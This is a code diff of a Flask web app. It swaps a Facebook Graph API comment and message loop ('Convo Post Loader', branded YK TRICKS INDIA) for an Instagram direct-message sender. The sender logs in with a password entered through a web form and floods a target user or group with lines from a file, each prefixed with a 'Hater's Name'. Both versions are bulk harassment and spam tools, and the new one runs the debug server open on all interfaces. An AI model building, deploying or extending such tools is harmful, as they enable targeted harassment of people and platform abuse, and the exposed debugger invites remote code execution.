@@ -1,140 +1,164 @@
-from flask import Flask, request
-import requests
-from time import sleep
+from flask import Flask, request, render_template_string
+from instagrapi import Client
 import time
-from datetime import datetime
+
 app = Flask(__name__)
-app.debug = True
 
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-    'referer': 'www.google.com'
-}
-
-@app.route('/', methods=['GET', 'POST'])
-def send_message():
-    if request.method == 'POST':
-        access_token = request.form.get('accessToken')
-        thread_id = request.form.get('threadId')
-        mn = request.form.get('kidx')
-        time_interval = int(request.form.get('time'))
-
-        txt_file = request.files['txtFile']
-        messages = txt_file.read().decode().splitlines()
-
-        while True:
-            try:
-                for message1 in messages:
-                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                    message = str(mn) + ' ' + message1
-                    parameters = {'access_token': access_token, 'message': message}
-                    response = requests.post(api_url, data=parameters, headers=headers)
-                    if response.status_code == 200:
-                        print(f"Message sent using token {access_token}: {message}")
-                    else:
-                        print(f"Failed to send message using token {access_token}: {message}")
-                    time.sleep(time_interval)
-            except Exception as e:
-                print(f"Error while sending message using token {access_token}: {message}")
-                print(e)
-                time.sleep(30)
-
-
-    return '''
-
+# HTML template for the web page
+HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>POST Server</title>
-  <title>Glass Button Hover Effects | Codehal</title>
-    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Automation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e1e2f;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #2e2e3e;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #ff5722;
+            color: #fff;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #e64a19;
+        }
+        .info {
+            font-size: 12px;
+            color: #aaa;
+        }
+    </style>
 </head>
 <body>
-    <button>Button
-        <span></span>
-        <span></span>
-    </button>
+    <div class="container">
+        <h1>Instagram Automation</h1>
+        <form action="/" method="POST" enctype="multipart/form-data">
+            <label for="username">Instagram Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter Instagram username" required>
+
+            <label for="password">Instagram Password:</label>
+            <input type="password" id="password" name="password" placeholder="Enter Instagram password" required>
+
+            <label for="choice">Send To:</label>
+            <select id="choice" name="choice" required>
+                <option value="inbox">Inbox</option>
+                <option value="group">Group</option>
+            </select>
+
+            <label for="target_username">Target Username (for Inbox):</label>
+            <input type="text" id="target_username" name="target_username" placeholder="Enter target username">
+
+            <label for="thread_id">Thread ID (for Group):</label>
+            <input type="text" id="thread_id" name="thread_id" placeholder="Enter group thread ID">
+
+            <label for="haters_name">Hater's Name:</label>
+            <input type="text" id="haters_name" name="haters_name" placeholder="Enter hater's name" required>
+
+            <label for="message_file">Message File:</label>
+            <input type="file" id="message_file" name="message_file" accept=".txt" required>
+            <p class="info">Upload a TXT file with one message per line.</p>
+
+            <label for="delay">Delay (in seconds):</label>
+            <input type="number" id="delay" name="delay" placeholder="Enter delay in seconds" required>
+
+            <button type="submit">Send Messages</button>
+        </form>
+    </div>
 </body>
 </html>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    body{
-      background-color: yellow;
-    }
-    .container{
-      max-width: 500px;
-      background-color: bisque;
-      border-radius: 10px;
-      padding: 20px;
-      box-shadow: 0 0 10px rgba(red,green,blue,alpha);
-      margin: 0 auto;
-      margin-top: 20px;
-    }
-    .header{
-      text-align: center;
-      padding-bottom: 20px;
-    }
-    .btn-submit{
-      width: 100%;
-      margin-top: 10px;
-    }
-    .footer{
-      text-align: center;
-      margin-top: 20px;
-      color: brown;
-    }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mb-3"> Post Server <h1 class="mt-3">🅾️🆆🅽🅴🆁 YK TRICKS INDIA</h1>
-  </header>
+'''
 
-  <div class="container">
-    <form action="/" method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="accessToken">Enter Your  Facebook Token:</label>
-        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
-      </div>
-      <div class="mb-3">
-        <label for="threadId">Enter Post Numeric-degit:</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx">Enter Post Owner Name:</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile">Select Your Comment file:</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
-      </div>
-      <div class="mb-3">
-        <label for="time">Comment Sending Speed in Seconds:</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Start server</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>&copy; Developed by yk tricks india 2024. All Rights Reserved.</p>
-    <p>🥵Convo Post Loader🥵</p>
-    <p>Keep enjoying  <a href="https://github.com/</a></p>
-  </footer>
-</body>
-  </html>
-    '''
+# Function to log in to Instagram
+def instagram_login(username, password):
+    try:
+        client = Client()
+        client.login(username, password)
+        print("[SUCCESS] Logged in successfully.")
+        return client
+    except Exception as e:
+        print(f"[ERROR] Login failed: {e}")
+        return None
 
+# Function to send messages
+def send_messages(client, choice, target_username, thread_id, messages, delay):
+    try:
+        if choice == "inbox":
+            user_id = client.user_id_from_username(target_username)
+            for message in messages:
+                client.direct_send(message, [user_id])
+                print(f"[SUCCESS] Sent message to {target_username}: {message}")
+                time.sleep(delay)
+        elif choice == "group":
+            for message in messages:
+                client.direct_send(message, thread_id=thread_id)
+                print(f"[SUCCESS] Sent message to group {thread_id}: {message}")
+                time.sleep(delay)
+    except Exception as e:
+        print(f"[ERROR] Failed to send messages: {e}")
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-    app.run(debug=True)
+@app.route("/", methods=["GET", "POST"])
+def home():
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        choice = request.form.get("choice")
+        target_username = request.form.get("target_username")
+        thread_id = request.form.get("thread_id")
+        haters_name = request.form.get("haters_name")
+        delay = int(request.form.get("delay"))
+        message_file = request.files["message_file"]
+
+        # Read messages from the uploaded file
+        try:
+            messages = [f"{haters_name}: {line.strip()}" for line in message_file.read().decode("utf-8").splitlines()]
+        except Exception as e:
+            return f"<p>Error reading file: {e}</p>"
+
+        # Log in to Instagram
+        client = instagram_login(username, password)
+        if not client:
+            return "<p>Login failed. Please check your credentials and try again.</p>"
+
+        # Send messages
+        send_messages(client, choice, target_username, thread_id, messages, delay)
+        return "<p>Messages sent successfully!</p>"
+
+    return render_template_string(HTML_TEMPLATE)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
     
